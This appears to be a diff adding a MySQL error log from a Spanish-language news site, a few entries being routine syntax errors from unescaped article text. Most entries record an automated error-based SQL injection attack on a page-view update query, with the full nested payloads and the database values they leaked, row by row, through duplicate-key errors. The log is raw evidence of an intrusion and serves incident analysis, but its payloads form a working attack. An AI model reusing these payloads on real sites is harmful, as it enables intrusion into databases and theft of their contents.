@@ -1,0 +1,927 @@
+Time : 09:02:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE opinion SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 07:32:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '000'000.00 (SESENTA Y CINCO MILLONES DE PESOS 00/100 M.N.), en un plazo no mayor' at line 1
+Raw SQL : CALL insertar('estado','chihuahua','chihuahua3',' Autorizan fideicomiso para proyecto del Aeropuerto Barrancas del Cobre-Creel','creel.jpg','Los integrantes de la LXIV Legislatura del Congreso del Estado, aprobaron por unanimidad de votos la autorización al Ejecutivo Estatal para la creación de un fideicomiso público para la ejecución del proyecto del Aeropuerto Regional Barrancas del Cobre-Creel, en el Municipio de Bocoyna, Chihuahua.','','El Fideicomiso tendrá por objeto administrar los recursos asignados para el pago de la indemnización, a fin de restituir, mitigar y prevenir los efectos materiales e inmateriales ocasionados por la ejecución del Proyecto del Aeropuerto Regional Barrancas del Cobre-Creel, en el Municipio de Bocoyna, Chihuahua.','','El patrimonio del Fideicomiso Público se integrará por:
+
+a) Las aportaciones que realice el Fideicomitente (Gobierno del Estado), hasta por un monto de $65'000'000.00 (SESENTA Y CINCO MILLONES DE PESOS 00/100 M.N.), en un plazo no mayor a 7.5 años, contados a partir de la firma del Contrato de Fideicomiso.','','b) Los rendimientos que se obtengan de la inversión de estos fondos.
+
+El Fideicomitente hará las aportaciones en ocho ministraciones, la primera se realizará dentro de los diez días siguientes a la celebración del contrato de Fideicomiso, por la cantidad de $8'667,000.00 (OCHO MILLONES SEISCIENTOS SESENTA Y SIETE MIL PESOS 00/100 M.N). Las siguientes seis, durante el mes de enero de los años 2017, 2018, 2019, 2020, 2021 y 2022, por la cantidad de $ 8'667'000.00 (OCHO MILLONES SEISCIENTOS SESENTA Y SIETE MIL PESOS 00/100 M.N), respectivamente; y la última, se efectuará en el mes de enero del año 2023, por un monto de $ 4'331'000.00 (CUATRO MILLONES TRESCIENTOS TREINTA Y UN MIL PESOS 00/100 M.N.).','','La fiduciaria deberá ser aquella institución que cuente con facultades para fungir como tal, que ofrezca las mejores condiciones operativas en el mercado y, en la medida en que las circunstancias así lo permitan, que cuente con sucursales próximas al lugar de asentamiento de la Comunidad Bosques de San Elías –Repechique, con el fin de facilitar cualquier trámite, si los hubiere.','','')
+
+Time : 07:32:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '000'000.00 (SESENTA Y CINCO MILLONES DE PESOS 00/100 M.N.), en un plazo no mayor' at line 1
+Raw SQL : CALL insertar('estado','chihuahua','chihuahua3',' Autorizan fideicomiso para proyecto del Aeropuerto Barrancas del Cobre-Creel','creel.jpg','Los integrantes de la LXIV Legislatura del Congreso del Estado, aprobaron por unanimidad de votos la autorización al Ejecutivo Estatal para la creación de un fideicomiso público para la ejecución del proyecto del Aeropuerto Regional Barrancas del Cobre-Creel, en el Municipio de Bocoyna, Chihuahua.','','El Fideicomiso tendrá por objeto administrar los recursos asignados para el pago de la indemnización, a fin de restituir, mitigar y prevenir los efectos materiales e inmateriales ocasionados por la ejecución del Proyecto del Aeropuerto Regional Barrancas del Cobre-Creel, en el Municipio de Bocoyna, Chihuahua.','','El patrimonio del Fideicomiso Público se integrará por:
+
+a) Las aportaciones que realice el Fideicomitente (Gobierno del Estado), hasta por un monto de $65'000'000.00 (SESENTA Y CINCO MILLONES DE PESOS 00/100 M.N.), en un plazo no mayor a 7.5 años, contados a partir de la firma del Contrato de Fideicomiso.','','b) Los rendimientos que se obtengan de la inversión de estos fondos.
+
+El Fideicomitente hará las aportaciones en ocho ministraciones, la primera se realizará dentro de los diez días siguientes a la celebración del contrato de Fideicomiso, por la cantidad de $8'667,000.00 (OCHO MILLONES SEISCIENTOS SESENTA Y SIETE MIL PESOS 00/100 M.N). Las siguientes seis, durante el mes de enero de los años 2017, 2018, 2019, 2020, 2021 y 2022, por la cantidad de $ 8'667'000.00 (OCHO MILLONES SEISCIENTOS SESENTA Y SIETE MIL PESOS 00/100 M.N), respectivamente; y la última, se efectuará en el mes de enero del año 2023, por un monto de $ 4'331'000.00 (CUATRO MILLONES TRESCIENTOS TREINTA Y UN MIL PESOS 00/100 M.N.).','','La fiduciaria deberá ser aquella institución que cuente con facultades para fungir como tal, que ofrezca las mejores condiciones operativas en el mercado y, en la medida en que las circunstancias así lo permitan, que cuente con sucursales próximas al lugar de asentamiento de la Comunidad Bosques de San Elías –Repechique, con el fin de facilitar cualquier trámite, si los hubiere.','','')
+
+Time : 07:02:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 05:50:19
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 54,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:50:16
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~ POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 53,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:50:13
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~Israel González Glez.'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 52,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:50:11
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 51,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:50:09
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 50,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:50:06
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 49,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:50:04
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~Luis Villegas Montes.'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 48,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:50:01
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~Luis Villegas Montes.'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 47,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:57
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 46,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:54
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,unhex(Hex(cast(opinion.autor as char))),0x27,0x7e) from `delbd`.opinion Order by id limit 46,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:52
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,unhex(Hex(cast(opinion.autor as char))),0x27,0x7e) from `delbd`.opinion Order by id limit 45,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:49
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~    Israel González Glez.                                    ' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 45,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:46
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 44,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:44
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,unhex(Hex(cast(opinion.autor as char))),0x27,0x7e) from `delbd`.opinion Order by id limit 44,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:40
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,unhex(Hex(cast(opinion.autor as char))),0x27,0x7e) from `delbd`.opinion Order by id limit 43,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~            Israel González Glez.                            ' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 43,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~Francisco Rodríguez Pérez'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 42,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:31
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,unhex(Hex(cast(opinion.autor as char))),0x27,0x7e) from `delbd`.opinion Order by id limit 42,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:28
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,unhex(Hex(cast(opinion.autor as char))),0x27,0x7e) from `delbd`.opinion Order by id limit 41,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~                      Israel González Glez.                  ' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 41,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 40,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:20
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,unhex(Hex(cast(opinion.autor as char))),0x27,0x7e) from `delbd`.opinion Order by id limit 40,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:17
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,unhex(Hex(cast(opinion.autor as char))),0x27,0x7e) from `delbd`.opinion Order by id limit 39,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:14
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 39,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:12
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~Israel González Glez.'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 38,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:09
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 37,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:07
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,unhex(Hex(cast(opinion.autor as char))),0x27,0x7e) from `delbd`.opinion Order by id limit 37,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:04
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,unhex(Hex(cast(opinion.autor as char))),0x27,0x7e) from `delbd`.opinion Order by id limit 36,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:49:01
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 36,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:59
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~   Israel González Glez.'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 35,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:55
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 34,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:52
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~Por:- Israel González Glez.'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 33,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:49
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~    Israel González Glez.'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 32,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:47
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~ Israel González Glez.'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 31,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:45
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 30,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:42
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~ Israel González Glez.'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 29,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:38
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 28,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~    Israel González Glez.'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 27,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 26,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 25,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~     Israel González Glez. '~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 24,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 23,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:22
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,unhex(Hex(cast(opinion.autor as char))),0x27,0x7e) from `delbd`.opinion Order by id limit 23,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:18
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,unhex(Hex(cast(opinion.autor as char))),0x27,0x7e) from `delbd`.opinion Order by id limit 22,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:15
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 22,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:12
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~ Israel González Glez.'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 21,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:09
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 20,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:07
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 19,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:04
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~Luis Villegas Montes'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 18,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:48:01
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 17,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:58
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 16,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:55
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ''~POR CARLOS JARAMILLO VELA'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,opinion.autor,0x27,0x7e) from `delbd`.opinion Order by id limit 15,1) ) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:47:53
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
